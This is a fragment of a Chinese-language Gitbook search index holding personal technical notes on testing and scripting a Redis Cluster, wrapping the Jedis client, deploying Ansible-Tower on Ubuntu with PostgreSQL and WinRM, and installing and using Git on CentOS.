d93d05facb7db5c223d0959a0e58d232334057e4 127.0.0.1:6393 slots: (0 slots) slave replicates 3768ff79e3e58a0ee9c1fef1ab04e7e395196fa8 [OK] All nodes agree about slots configuration. >>> Check for open slots... >>> Check slots coverage... [OK] All 16384 slots covered. 7.3. 测试 现在测试Redis Cluster是否能正常工作。 通过Redis测试客户端命令redis-cli连接到集群任意一个节点： cd /usr/local/redis-4.0.10/src/ # 切换到启动脚本目录 ./redis-cli -c -h 127.0.0.1 -p 6390 # 以集群方式连接到Redis-6390节点 这里需要注意，与前面单机/主从/哨兵模式不同的是，客户端命令redis-cli需要增加一个-c参数，表示是连接到集群，这样客户端的读写行为才是在整个集群中可见的。 若不加-c参数虽然也可连接，但是仅仅是连接到当前的节点，是无法进行数据读写的（除非所读写的数据的键值，经过Hash计算得到的slot槽号，刚好在这个节点里面）。 现在在6390节点执行get命令，获取键名为site的数据： 127.0.0.1:6390> get site (nil) # 由于是新部署的Redis集群，该键值必定不存在 然后在6390节点写入数据（执行set命令，为键site设置数据）： 127.0.0.1:6390> set site http://exp-blog.com 再通过Redis测试客户端命令redis-cli连接到集群另一个节点： cd /usr/local/redis-4.0.10/src/ # 切换到启动脚本目录 ./redis-cli -c -h 127.0.0.1 -p 6395 # 以集群方式连接到Redis-6395节点 在6395节点执行get命令，获取键名为site的数据（经过集群节点转发请求，可以取到数据）： 127.0.0.1:6395> get site \"http://exp-blog.com\" 现在尝试一下不以集群方式连接到节点6395，会发生什么： cd /usr/local/redis-4.0.10/src/ # 切换到启动脚本目录 ./redis-cli -h 127.0.0.1 -p 6395 # 以单点方式连接到Redis-6395节点（无-c参数） 127.0.0.1:6395> get site # 获取键值为site的数据 (error) MOVED 9421 127.0.0.1:6392 # 报错：该数据在6392节点的9421槽位 127.0.0.1:6395> set site http://exp-blog.com # 设置键为site的值 (error) MOVED 9421 127.0.0.1:6392 # 报错：该键应该设置到6392节点的9421槽位 # 有些版本的报错信息是这样的，意思是相同的： # -> Redirected to slot [9421] located at 127.0.0.1:6392 之所以会发生这种情况，其实最开始的Redis Cluster架构介绍的时候就已经解释了原因了： Redis Cluster没有使用一致性Hash，而是采用slot（槽）的概念，一共分成16384个槽。在构建集群时，这些槽会不重复地平均被分配到集群中的主节点。 在读写数据时，Redis Cluster会先计算该数据的键值的slot号，然后再把读写请求分配到该slot号所属的Redis节点。 而当不以集群方式连接到集群节点时，在计算slot号后，读写请求的分配工作却无法执行，就会出现上述报错。 7.4. 集群的关闭/重启 Redis Cluster的官方文档并没有提供整个集群的关闭与重启的方法。推测可能是由于集群所有节点同时挂掉的可能性不高，毕竟即使偶尔集群中某个节点挂掉了，待其重启后又会自动重新加入集群，并不会带来太大影响。 但是可能性不高并不代表不会发生，如何关闭/重启整个集群的方式还是需要知道的。 集群的关闭，执行这个命令即可（如果是部署到多台IP机器，需要登陆到每一台机器执行）： pkill redis # 是的，直接杀掉集群的全部节点进程就可以了 集群的重启，只需要重新启动原集群中每一个节点就可以了，集群会自动恢复到关闭之前的状态（前提是不能删除node-*.conf、*.aof、*.rdb文件，否则会造成集群数据丢失）。 **至此Redis Cluster集群模式部署完成。** 7.5. 附：集群模式一键启动/停止/重启脚本 [success] ● 脚本下载：https://share.weiyun.com/5Q9lCkE 密码：aby4vq ● 此脚本是根据上文的部署方式和位置编写的，仅适用于Redis节点均在同一台机器的场景。 若要移植到其他地方使用，需要根据实际情况修改。 脚本内容如下： #!/bin/bash # 根据主从/哨兵模式的部署目录对应修改 export cluster_path=/usr/local/redis-cluster # 启动函数 start() { ${cluster_path}/redis-6390/src/redis-server ${cluster_path}/redis-6390/redis.conf & ${cluster_path}/redis-6391/src/redis-server ${cluster_path}/redis-6391/redis.conf & ${cluster_path}/redis-6392/src/redis-server ${cluster_path}/redis-6392/redis.conf & ${cluster_path}/redis-6393/src/redis-server ${cluster_path}/redis-6393/redis.conf & ${cluster_path}/redis-6394/src/redis-server ${cluster_path}/redis-6394/redis.conf & ${cluster_path}/redis-6395/src/redis-server ${cluster_path}/redis-6395/redis.conf & echo \"all running\" } # 停止函数 stop() { ps -ef | grep \"redis\" | grep -v \"grep\" |awk '{print $2}'| while read pid do C_PID=$(ps --no-heading $pid | wc -l) if [[ $C_PID == \"1\" ]]; then kill -9 $pid echo \"PID=$pid is dead\" else echo \"PID=$pid not exists\" fi done echo \"all dead\" } # 脚本入口参数 start|stop|restart case \"$1\" in start) start ;; stop) stop ;; restart) stop start ;; *) printf 'Usage: %s {start|stop|restart}\\n'\"$prog\" exit 1 ;; esac 这是shell脚本，保存为redis-cluster.sh（文件名任意）即可执行（若无法执行可能是换行符问题，可尝试通过dos2unix命令修正换行符）。 使用方式如下： sh redis-cluster.sh start # 启动 sh redis-cluster.sh stop # 停止 sh redis-cluster.sh restart # 重启 8. 附：Redis核心配置文件汉化版注释 8.1. 服务配置redis.conf [success] ● 汉化配置文件redis-chs.conf下载：https://share.weiyun.com/57e0NrS 密码：m48s6g ● 8.2. 哨兵配置sentinel.conf [success] ● 汉化配置文件sentinel-chs.conf下载：https://share.weiyun.com/5eFlsU6 密码：4vr68i ● 9. 附：Jedis客户端封装 官方提供的Jedis的POM如下： redis.clients jedis 2.9.0 Jedis是在Java中比较强大的Redis客户端连接工具，暴露了很多Redis的API接口，能够很灵活地操作Redis。但是也正由于暴露了太多Redis的连接细节、过份灵活，在生产环境中使用并不方便。 为了解决这些缺点，使之更易于使用，我在2.9.0版本之上做了封装，其主要特点有： 屏蔽Jedis与JedisCluster的连接细节和差异，统一封装成RedisClient类，并内置连接池 统一Jedis与JedisCluster连接的配置项，封装成RedisBean类，主要供RedisClient使用 屏蔽byte[]数据类型，所有实现了序列化接口的对象均可直接在Redis进行读写 保留String数据类型（并不会序列化成byte[]，目的是保留与其他程序交互数据的方式） 把Redis的Map封装成RedisMap类（key强制为String），暴露API模仿Java的Map 把Redis的Set封装成RedisSet类，暴露API模仿Java的Set 把Redis的List封装成RedisList类，暴露API模仿Java的List 把Redis的单键值对封装成RedisObj类 下面是各个场景的使用样例演示（源码见Github）： import exp.libs.warp.db.redis.RedisClient; import exp.libs.warp.db.redis.bean.RedisList; import exp.libs.warp.db.redis.bean.RedisMap; import exp.libs.warp.db.redis.bean.RedisObj; import exp.libs.warp.db.redis.bean.RedisSet; /** * * RedisClient测试/场景演示. * * PROJECT : exp-libs * SUPPORT : www.exp-blog.com * @version 2018-07-31 * @author EXP: 272629724@qq.com * @since jdk版本：jdk1.6 */ public class TestRedisClient { public static void main(String[] args) { /*********************** Redis连接样例 ***********************/ // 场景1 - Redis 单机模式 // 127.0.0.1:6379 RedisClient redis = new RedisClient(\"127.0.0.1\", 6379); // 场景2 - Redis 主从模式 // （若用于[读写]只能连接主机，若仅[读]则可连接主/从，但无论如何只能连接其中一台） // 主机： 127.0.0.1:6379 // 从机： 127.0.0.1:6380, 127.0.0.1:6381, 127.0.0.1:6382 redis = new RedisClient(\"127.0.0.1\", 6379); // 场景3 - Redis 哨兵模式 // （若用于[读写]只能连接主机，若仅[读]则可连接主/从，但无论如何只能连接其中一台，哨兵不允许连接） // 主机： 127.0.0.1:6379 // 从机： 127.0.0.1:6380, 127.0.0.1:6381, 127.0.0.1:6382 // 哨兵： 127.0.0.1:26380, 127.0.0.1:26381, 127.0.0.1:26382 redis = new RedisClient(\"127.0.0.1\", 6379); // 场景4 - Redis 集群模式 // 集群节点 （需同时连接所有节点）： // 127.0.0.1:6390, 127.0.0.1:6391, 127.0.0.1:6392 // 127.0.0.1:6393, 127.0.0.1:6394, 127.0.0.1:6395 redis = new RedisClient( \"127.0.0.1:6390\", \"127.0.0.1:6391\", \"127.0.0.1:6392\", \"127.0.0.1:6393\", \"127.0.0.1:6394\", \"127.0.0.1:6395\" ); /*********************** Redis操作样例 ***********************/ // RedisMap示例 final String REDIS_MAP_KEY = \"REDIS_MAP_KEY\"; // 这个Map对象在Redis中的键值 RedisMap map = new RedisMap(REDIS_MAP_KEY, redis); map.put(\"site\", new SerialObject(1, \"http://exp-blog.com\")); map.put(\"mail\", new SerialObject(2, \"289065406@qq.com\")); System.out.println(map.size()); System.out.println(map.get(\"site\")); System.out.println(map.get(\"mail\")); map.clear(); // RedisList示例 final String REDIS_LIST_KEY = \"REDIS_LIST_KEY\"; // 这个List对象在Redis中的键值 RedisList list = new RedisList(REDIS_LIST_KEY, redis); list.add(new SerialObject(3, \"EXP-LIST\")); System.out.println(list.size()); System.out.println(list.get(0)); list.clear(); // RedisSet示例 final String REDIS_SET_KEY = \"REDIS_SET_KEY\"; // 这个Set对象在Redis中的键值 RedisSet set = new RedisSet(REDIS_SET_KEY, redis); set.add(new SerialObject(4, \"http://exp-blog.com\")); set.add(new SerialObject(5, \"289065406@qq.com\")); System.out.println(set.size()); System.out.println(set.getRandom()); set.clear(); // RedisObj示例 final String REDIS_OBJ_KEY = \"REDIS_OBJ_KEY\"; // 这个Obj对象在Redis中的键值 RedisObj obj = new RedisObj(REDIS_OBJ_KEY, redis); obj.set(new SerialObject(6, \"EXP-OBJ\")); System.out.println(obj.exists()); System.out.println(obj.get()); obj.clear(); // 断开redis连接 redis.close(); } /** * * 测试用的序列化对象. * 必须实现java.io.Serializable接口 * */ private static class SerialObject implements Serializable { private static final long serialVersionUID = -6911765769239092862L; private int id; private String value; private SerialObject(int id, String value) { this.id = id; this.value = value; } public String toString() { return id + \":\" + value; } } } 10. 资源下载 本文全文下载 文中配置文件/脚本下载（密码：359wqw） Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/scm/":{"url":"markdown/notes/scm/","title":"配置管理","keywords":"","body":"软件配置管理软件配置管理 Ansible-Tower 部署笔记 Git命令行安装与使用笔记 VisualSVN 使用手册 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/scm/AnsibleTower部署笔记.html":{"url":"markdown/notes/scm/AnsibleTower部署笔记.html","title":"Ansible-Tower 部署笔记","keywords":"","body":"Ansible-Tower 部署笔记前言1. 部署说明1.1. 安装环境1.2. 安装清单2. 安装步骤2.1. 安装 pywinrm（可选）2.2. 添加相关用户并授权2.3. 安装 Ansbile-2.7.52.4. 安装 PostgreSQL-9.62.5. 安装 Ansible-Tower-3.3.32.6. Ansible-Tower授权3. 附：被控主机为 Windows 时的额外配置3.1. 查看 PowerShell 与 .NET 版本并升级3.2. 安装并查看 WinRM 服务3.3. Ansible 测试 WinRM 连接Ansible-Tower 部署笔记 前言 作为时下最流行的自动化运维工具之一，Ansible 在业界应该是无人不知无人不晓的了。 作为一款轻量化的开源软件，它只需要简单地通过 SSH（对Linux平台）或 PowerShell（对Windows平台），无需被控主机安装客户端，就能实现远程操控、部署、升级等配置管理。 通过编写简单的 playbooks（yml） 脚本就能轻松对成千上万的主机进行区域管控、日常巡检等任务。 而 Ansible-Tower （旧称 AWX）作为其配套界面，使得 Ansible 更容易上手。 这里提供一些官方资料： Ansible 官网 : https://www.ansible.com/ Ansible-Tower 官网 : https://www.ansible.com/products/tower Ansible 官方文档（全） : https://docs.ansible.com/ Ansible 官方教程（英文版） : https://docs.ansible.com/ansible/latest/index.html Ansible 官方教程（中文版） : http://www.ansible.com.cn/docs/intro.html Ansible Github : https://github.com/ansible 1. 部署说明 本文主要记录了在 ubuntu 上部署 Ansible 和 Ansible-Tower 的过程。 虽然 Ansible-Tower 支持在多种操作系统版本上部署，但对于 ubuntu 只支持 14.0 和 16.0 两个版本（而 Ansible 则是支持到 ubuntu 18.0）。 为了可以同时安装 Ansible 和 Ansible-Tower ，本文选择了 ubuntu 16.0 系统进行安装。 1.1. 安装环境 操作系统：Ubuntu 16.04.5 LTS 预装软件：python 2.7、openssh 1.2. 安装清单 pywinrm （要求版本至少为 0.2.2，若不管理 windows 机器则无需安装） Ansible-2.7.5 （ 要求 python 版本 2.6 或 2.7 ） PostgreSQL-9.6 Ansible-Tower-3.3.3 （ 要求 Ansible 版本至少为 2.2，PostgreSQL版本至少为 9.6 ） 预装组件要求可查看官方手册指引：https://docs.ansible.com/ansible-tower/latest/html/quickinstall/prepare.html 2. 安装步骤 注意下述步骤直接依次复制执行即可完成整个部署流程，其中对于命令行前缀： 【#】表示 root 用户 【$】表示普通用户 2.1. 安装 pywinrm（可选） # apt install python-pip # 安装 pip # pip install --upgrade pip # 更新 pip # pip install \"pywinrm>=0.2.2\" # 使用 pip 安装 pywinrm，此模块用于远程管理 windows 机器 2.2. 添加相关用户并授权 # adduser ansible # 添加 ansible 专用用户 # chmod u+w /etc/sudoers # 修改 sudo 配置文件为可写 # vi /etc/sudoers # 修改 sudo 配置文件，对 ansible 和 postgres 用户授权，便于后面安装 root ALL=(ALL:ALL) ALL ansible ALL=(ALL:ALL) ALL awx ALL=(ALL:ALL) ALL # 安装 Ansible-Tower 时自动创建的用户 postgres ALL=(ALL:ALL) ALL # 安装 PostgreSQL 时自动创建的用户 # chmod u-w /etc/sudoers 2.3. 安装 Ansbile-2.7.5 相关过程整理自官方手册：https://ansible-tran.readthedocs.io/en/latest/docs/intro_installation.html#apt-ubuntu # su - ansible # 切换到 ansible 用户 $ sudo apt-get install software-properties-common # 在早期 Ubuntu 发行版中, “software-properties-common” 名为 “python-software-properties”，根据实际情况修改 $ sudo apt-add-repository ppa:ansible/ansible $ sudo apt-get update $ sudo apt-get install ansible # 安装 $ ansible --version # 若安装成功，核验版本 ansible 2.7.5 config file = /etc/ansible/ansible.cfg configured module search path = [u'/home/ansible/.ansible/plugins/modules', u'/usr/share/ansible/plugins/modules'] ansible python module location = /usr/lib/python2.7/dist-packages/ansible executable location = /usr/bin/ansible python version = 2.7.15rc1 (default, Nov 12 2018, 14:31:15) [GCC 7.3.0] 关于 Asible 的相关配置： 　　　○ 配置文件位置为 /etc/ansible/ansible.cfg 　　　○ 主机清单文件为 /etc/ansible/hosts （用于配置主机分组、连接方式等） 　　　○ playbooks 目录位置默认为 /etc/ansible/ ，若目录不存在，可手工创建 2.4. 安装 PostgreSQL-9.6 部分过程参考自CSDN：https://blog.csdn.net/zpf336/article/details/50843674 # 注意 Ubuntu 16.0 默认的 PostgreSQL 安装源是 9.5 版本的，不符合要求，需要更新安装源后再安装 $ sudo add-apt-repository \"deb http://apt.postgresql.org/pub/repos/apt/ xenial-pgdg main\" $ wget --quiet -O - https://www.postgresql.org/media/keys/ACCC4CF8.asc | sudo apt-key add - $ sudo apt-get update $ sudo apt-get install postgresql-9.6 # 安装完成后会自动新增数据库用户 postgres $ sudo su postgres $ psql postgres # 登录数据库 ALTER USER postgres with PASSWORD 'postgres'; # 修改 postgres 用户的数据库密码 \\q # 退出数据库 # 修改数据库配置（ 默认只允许本地连接，由于只有 Ansible-Tower 用，因此无需更改相关连接配置 ） $ vi /etc/postgresql//main/postgresql.conf # 此处的 根据实际安装的 PostgreSQL 版本修改 password_encryption = on # 去掉注释，启用密码验证登录方式 # 重启数据库使配置生效 $ sudo systemctl unmask postgresql $ sudo systemctl restart postgresql $ psql -U postgres -h 127.0.0.1 # 测试本地账密登录 CREATE USER ansible WITH PASSWORD 'ansible'; # 创建 Ansible-Tower 用的数据库用户 ansible CREATE DATABASE tower OWNER ansible; # 创建 Ansible-Tower 用的数据库 tower GRANT ALL PRIVILEGES ON DATABASE tower TO ansible; # 把 tower 库的所有权限授权给 ansible 用户 \\q # 退出数据库 # 测试使用 ansible 用户登录 tower 数据库： $ psql -U ansible -h 127.0.0.1 -d tower \\q # 可选（需图形界面支持） $ sudo apt-get install pgadmin3 # 可安装 PostgreSQL 库的图形客户端 $ pgadmin3 # 启动客户端 2.5. 安装 Ansible-Tower-3.3.3 相关过程整理自官方手册：https://docs.ansible.com/ansible-tower/latest/html/quickinstall/download_tower.html 部分过程参考自CSDN：https://blog.csdn.net/CodyGuo/article/details/78875717 在 ubuntu 系统下，Ansible-Tower 只能下载 Ansible 的 playbooks 脚本，由 Ansible 在线安装。 playbooks 脚本可从 此处 提取（目前最后的 latest 版是3.3.3）。 下载最后版本 ansible-tower-setup-latest.tar.gz 后，上传到任意目录即可。 # 上传到 ansible-tower-setup-latest.tar.gz 到 /tmp 目录 $ sudo su ansible # 切换 ansible 用户执行安装过程 $ tar xvzf ansible-tower-setup-latest.tar.gz # 解包 $ cd ansible-tower-setup- # tower_version 根据实际的 Ansible-Tower 版本号修改 $ vi inventory # 修改安装配置，根据前面流程设置的参数对号入座即可 [tower] localhost ansible_connection=local [database] [all:vars] admin_password='admin' pg_host='127.0.0.1' pg_port='5432' pg_database='tower' pg_username='ansible' pg_password='ansible' rabbitmq_username=tower rabbitmq_password='admin' rabbitmq_cookie=cookiemonster # 执行安装 $ sudo ./setup.sh 2.6. Ansible-Tower授权 安装成功后，可通过访问 https:/// 登录 Ansible-Tower （只能使用 HTTPS 协议） 登录账密在前面安装时已配置为：admin/admin （登录成功后，可以在【Users】里面修改） 登录成功后需要导入License授权，License 可以在官网申请，官方提供了 10 个管理节点的 免费 License 3. 附：被控主机为 Windows 时的额外配置 相关内容参考自： 　　　○ 官方指引手册（英文版）：https://docs.ansible.com/ansible/latest/user_guide/windows_setup.html 　　　○ 官方指引手册（中文版）：https://ansible-tran.readthedocs.io/en/latest/docs/intro_windows.html# 　　　○ 百度百家号：https://baijiahao.baidu.com/s?id=1580415145694814528&wfr=spider&for=pc 为了控制 Windows 主机，作为被控端的 Windows 必须具备以下几个条件： 操作系统版本限制为：桌面版 Windows 7、8.1、10 ；服务器版 Windows Server 2008、2012、2016 Windows上必须已经安装了 PowerShell 3.0 或更新版本 Windows上必须已经安装了 .NET Framework 4.0 或更新版本 WinRM 服务已经被创建并启动服务，相关服务端口没有被防火墙等拦截 3.1. 查看 PowerShell 与 .NET 版本并升级 运行 PowerShell （注意不是 CMD，一般 Win8 之后都默认安装） 输入命令 Get-Host 可查看当前 PowerShell 版本 输入命令 $PSVersionTable.CLRVersion 可查看当前 .NET Framework 版本 若 PowerShell 版本不满足要求，可参考 此处 的升级步骤进行升级 3.2. 安装并查看 WinRM 服务 详细安装步骤可参考 这里 为方便起见，Ansible 官方已提供了 WinRM 的自动安装与配置脚本：https://github.com/ansible/ansible/blob/devel/examples/scripts/ConfigureRemotingForAnsible.ps1 下载脚本后，在 PowerShell 执行命令即可完成安装： powershell.exe -ExecutionPolicy ByPass -File ConfigureRemotingForAnsible.ps1 安装完成后，输入命令 winrm enumerate winrm/config/Listener 或 winrm qc 可查看 WinRM 的服务状态 确认 WinRM 正在监听 HTTPS 5986 端口即配置成功，注意防火墙也要开放相关端口 3.3. Ansible 测试 WinRM 连接 注意，Ansible 主机必须已安装 pywinrm，相关步骤详见 这里 测试方法：修改 Ansible 主机的配置文件 /etc/ansible/hosts，在其末尾添加一行（其中 ${win_ip}、 ${win_username}、 ${win_password} 需根据实际情况修改）： ${win_ip} ansible_user=\"${win_username}\" ansible_password=\"${win_password}\" ansible_port=\"5986\" ansible_connection=\"winrm\" ansible_winrm_server_cert_validation=\"ignore\" ansible_winrm_transport=\"ssl\" 然后执行命令 ansible ${win_ip} -m win_ping 即可，若响应为 pong 则配置成功： Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/scm/Git命令行安装与使用笔记.html":{"url":"markdown/notes/scm/Git命令行安装与使用笔记.html","title":"Git 命令行安装与使用笔记","keywords":"","body":"Git命令行安装与使用笔记1. 安装环境2. Git下载3. Git安装4. 连接Github5. Git命令手册5.1. 专有名词5.2. 新建代码库5.3. 配置5.4. 增加/删除文件5.5. 代码提交5.6. 分支5.7. 标签5.8. 查看信息5.9. 远程同步5.10. 撤销5.11. 其他6. 示例：工作中使用Git的一般流程资源下载Git命令行安装与使用笔记 1. 安装环境 操作系统：Centos 7 （纯命令行环境） Git服务器：Github 安装的Git命令行版本：1.8.3.1 2. Git下载 首先需要安装git的依赖包： yum install curl curl-devel zlib-devel openssl-devel perl cpio expat-devel gettext-devel 切到安装目录： cd /usr/local Centos自带的Git版本比较旧，这里直接到官网下载最新版 ： wget http://www.codemonkey.org.uk/projects/git-snapshots/git/git-latest.tar.xz 注意下载回来的是.xz包（注意不是.gz包，我下载的时候，.gz包是0字节，可能是官方的问题），对其解压： xz -d git-latest.tar.xz tar -xvf git-latest.tar 解压出来的文件夹是 git-xxxx-xx-xx（xxxx-xx-xx是版本的日期，例如2018-07-23），切到该目录下： cd git-xxxx-xx-xx 3. Git安装 生成Git的配置脚本configure： autoconf 修改安装路径，可随意指定： ./configure --prefix=/usr/local/git 注意，若指定的安装路径不存在，则需要先预建目录： mkdir -p /usr/local/git 编译并安装： make | make install 把Git命令添加到系统环境变量，修改系统环境变量文件： vi /etc/profile 在文件最后添加以下内容： GIT_HOME=/usr/local/git PATH=$PATH:$GIT_HOME/bin export GIT_HOME PATH 重载系统环境变量使其生效： source /etc/profile 通过查看git版本号验证是否安装成功： git --version 至此Git命令行安装完成。 注： ○ 若安装时不通过 ./configure --prefix=xxx 命令指定安装路径，那么Git的可执行文件默认放在/usr /local/bin，库文件默认放在/usr/local/lib，配置文件默认放在/usr/local/etc，其它的资源文件放在/usr /local/share ○ 那么当需要卸载Git时，要么在原来的make目录下执行make uninstall（前提是make文件指定过uninstall），要么在上述目录中把相关的文件一个个手工删掉。 ○ 但若指定了安装路径，则只需直接删掉该路径文件夹即可。 4. 连接Github 配置Github的账号和邮箱： git config --global user.name \"你的Github账号\" git config --global user.email \"你的Github邮箱\" 生成该GitHub账号的SSH Keys（本质是RSA公私钥）： ssh-keygen -t rsa -C \"你的Github邮箱\" 运行该命令后，系统会确认一些问题，什么都不用输入，保持默认，连续三次回车即可。 期间系统会提示所生成的RSA公私钥保存位置（一般在~/.ssh目录）： 私钥文件位置：~/.ssh/id_rsa 公钥文件位置：~/.ssh/id_rsa.pub 私钥不要动，只需把公钥设置到Github上就可以实现连接了。 先查看公钥文件内容： cat ~/.ssh/id_rsa.pub 然后在浏览器登陆你的Github： Settings => SSH and GPG Keys => New SSH key 把公钥内容复制进去并保存即可： 注： 以后在这台Centos机器连接到Github时，就是使用这对RSA公私密钥，而不用通过Github密码，所以需要保管好这对密钥。 回到Centos，输入以下命令尝试连接到Github： ssh -T git@github.com 此时会提示以下内容，输入yes即可： The authenticity of host 'github.com (xxx.xxx.xxx.xxx)' can't be established. RSA key fingerprint is xx.xx.xx.xx.xx.xx.xx.xx.xx.xx.xx.xx.xx.xx.xx.xx. Are you sure you want to continue connecting (yes/no)? yes 最终提示以下内容则表示连接成功： Warning: Permanently added 'github.com, xxx.xxx.xxx.xxx' (RSA) to the list of known hosts. Hi smartwen! You've successfully authenticated, but GitHub does not provide shell access. 此时随便指定一个目录并切换进去，如： cd /tmp/ 把该目录初始化为Git的代码仓库： git init 然后就可以同步Github上的项目代码（和它的整个代码历史）到本地了： git clone 项目仓库URL 5. Git命令手册 由于Centos下并不支持图形化界面（我用的是云服务器，纯命令行），因此需要熟悉Git的命令进行代码版本维护。 一般来说，日常使用只要记住下图6个命令就可以了： 但为了日后使用方便起见，此处整理一下Git的命令清单： 5.1. 专有名词 Workspace：工作区 Index / Stage：暂存区 Repository：仓库区（或本地仓库） Remote：远程仓库 5.2. 新建代码库 # 在当前目录新建一个Git代码库 git init   # 新建一个目录，将其初始化为Git代码库 git init [project-name]   # 下载一个项目和它的整个代码历史 git clone [url] 5.3. 配置 Git的配置文件为.gitconfig，它可以在用户主目录下（全局配置），也可以在项目目录下（项目配置）。 # 显示当前的Git配置 git config --list   # 编辑Git配置文件 git config -e [--global]   # 设置提交代码时的用户信息 git config [--global] user.name \"[name]\" git config [--global] user.email \"[email address]\" 5.4. 增加/删除文件 # 添加指定文件到暂存区 git add [file1] [file2] ...   # 添加指定目录到暂存区，包括子目录 git add [dir]   # 添加当前目录的所有文件到暂存区 git add .   # 添加每个变化前，都会要求确认 # 对于同一个文件的多处变化，可以实现分次提交 git add -p   # 删除工作区文件，并且将这次删除放入暂存区 git rm [file1] [file2] ...   # 停止追踪指定文件，但该文件会保留在工作区 git rm --cached [file]   # 改名文件，并且将这个改名放入暂存区 git mv [file-original] [file-renamed] 5.5. 代码提交 # 提交暂存区到仓库区 git commit -m [message]   # 提交暂存区的指定文件到仓库区 git commit [file1] [file2] ... -m [message]   # 提交工作区自上次commit之后的变化，直接到仓库区 git commit -a   # 提交时显示所有diff信息 git commit -v   # 使用一次新的commit，替代上一次提交 # 如果代码没有任何新变化，则用来改写上一次commit的提交信息 git commit --amend -m [message]   # 重做上一次commit，并包括指定文件的新变化 git commit --amend [file1] [file2] ... 5.6. 分支 # 列出所有本地分支 git branch   # 列出所有远程分支 git branch -r   # 列出所有本地分支和远程分支 git branch -a   # 新建一个分支，但依然停留在当前分支 git branch [branch-name]   # 新建一个分支，并切换到该分支 git checkout -b [branch]   # 新建一个分支，指向指定commit git branch [branch] [commit]   # 新建一个分支，与指定的远程分支建立追踪关系 git branch --track [branch] [remote-branch]   # 切换到指定分支，并更新工作区 git checkout [branch-name]   # 切换到上一个分支 git checkout -   # 建立追踪关系，在现有分支与指定的远程分支之间 git branch --set-upstream [branch] [remote-branch]   # 合并指定分支到当前分支 git merge [branch]   # 选择一个commit，合并进当前分支 git cherry-pick [commit]   # 删除分支 git branch -d [branch-name]   # 删除远程分支 git push origin --delete [branch-name] git branch -dr [remote/branch] 5.7. 标签 # 列出所有tag git tag   # 新建一个tag在当前commit git tag [tag]   # 新建一个tag在指定commit git tag [tag] [commit]   # 删除本地tag git tag -d [tag]   # 删除远程tag git push origin :refs/tags/[tagName]   # 查看tag信息 git show [tag]   # 提交指定tag git push [remote] [tag]   # 提交所有tag git push [remote] --tags   # 新建一个分支，指向某个tag git checkout -b [branch] [tag] 5.8. 查看信息 # 显示有变更的文件 git status   # 显示当前分支的版本历史 git log   # 显示commit历史，以及每次commit发生变更的文件 git log --stat   # 搜索提交历史，根据关键词 git log -S [keyword]   # 显示某个commit之后的所有变动，每个commit占据一行 git log [tag] HEAD --pretty=format:%s   # 显示某个commit之后的所有变动，其\"提交说明\"必须符合搜索条件 git log [tag] HEAD --grep feature   # 显示某个文件的版本历史，包括文件改名 git log --follow [file] git whatchanged [file]   # 显示指定文件相关的每一次diff git log -p [file]   # 显示过去5次提交 git log -5 --pretty --oneline   # 显示所有提交过的用户，按提交次数排序 git shortlog -sn   # 显示指定文件是什么人在什么时间修改过 git blame [file]   # 显示暂存区和工作区的代码差异 git diff   # 显示暂存区和上一个commit的差异 git diff --cached [file]   # 显示工作区与当前分支最新commit之间的差异 git diff HEAD   # 显示两次提交之间的差异 git diff [first-branch]...[second-branch]   # 显示今天你写了多少行代码 git diff --shortstat \"@{0 day ago}\"   # 显示某次提交的元数据和内容变化 git show [commit]   # 显示某次提交发生变化的文件 git show --name-only [commit]   # 显示某次提交时，某个文件的内容 git show [commit]:[filename]   # 显示当前分支的最近几次提交 git reflog   # 从本地master拉取代码更新当前分支：branch 一般为master git rebase [branch] 5.9. 远程同步 # 下载远程仓库的所有变动 git fetch [remote]   # 显示所有远程仓库 git remote -v   # 显示某个远程仓库的信息 git remote show [remote]   # 增加一个新的远程仓库，并命名 git remote add [shortname] [url]   # 取回远程仓库的变化，并与本地分支合并 git pull [remote] [branch]   # 上传本地指定分支到远程仓库 git push [remote] [branch]   # 强行推送当前分支到远程仓库，即使有冲突 git push [remote] --force   # 推送所有分支到远程仓库 git push [remote] --all 5.10. 撤销 # 恢复暂存区的指定文件到工作区 git checkout [file]   # 恢复某个commit的指定文件到暂存区和工作区 git checkout [commit] [file]   # 恢复暂存区的所有文件到工作区 git checkout .   # 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变 git reset [file]   # 重置暂存区与工作区，与上一次commit保持一致 git reset --hard   # 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变 git reset [commit]   # 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致 git reset --hard [commit]   # 重置当前HEAD为指定commit，但保持暂存区和工作区不变 git reset --keep [commit]   # 新建一个commit，用来撤销指定commit # 后者的所有变化都将被前者抵消，并且应用到当前分支 git revert [commit]   # 暂时将未提交的变化移除，稍后再移入 git stash git stash pop 5.11. 其他 # 生成一个可供发布的压缩包 git archive 6. 示例：工作中使用Git的一般流程 （1）下载远程代码仓库并创建分支： 　　　　git clone [远程代码仓库] 　　　　git branch [本地分支名称] （创建本地分支） 　　　　git branch （查看本地所有分支） 　　　　git checkout [本地分支名称] （切换到本地分支） （2） 写代码....... （3） 确认变更并提交： 　　　　git status （查看文件改变记录） 　　　　git diff （查看代码级改变） 　　　　git add （确认改变） 　　　　git commit -m 提交注释 （提交到当前分支的本地工作区） 　　　　git push [远程分支：origin] [本地分支的名称] （上传本地分支到远程仓库） （4） 去Git管理网站（如Github）创建Merge Request （5） 等待管理员（有选择地）合并所有人的Merge Request （6） 管理员合并后，从远程代码仓库更新本地分支： 　　　　git checkout master （切换至master） 　　　　git pull （从远程master更新至本地master） 　　　　git checkout [本地分支名称] （切换至本地分支） 　　　　git rebase master [本地分支名称] （从本地master拉取代码更新当前分支） （7） 拉取更新过程中，若有冲突的解决方法： 　　　　① 修改代码文件并解决冲突 　　　　② git add . （加入待提交） 　　　　③ git rebase --continue （继续执行前面第6步的rebase） 　　　　④ 如果仍然有冲突，重复前面①②③步骤 　　　　⑤ git rebase --skip （无法解决冲突时的处理手法1：直接用master覆盖本地分支） 　　　　⑥ git push -f origin [本地分支名称] （无法解决冲突时的处理手法2：强制用本地的代码去覆盖掉远程仓库的代码。其中origin为远程仓库名） （8） 去Git管理网站（如Github）重新创建Merge Request （9） 等待管理员合并Merge Request....... （10）重复上述对应步骤....... 资源下载 本文全文下载 Copyright © EXP 2020 all right reserved，powered by 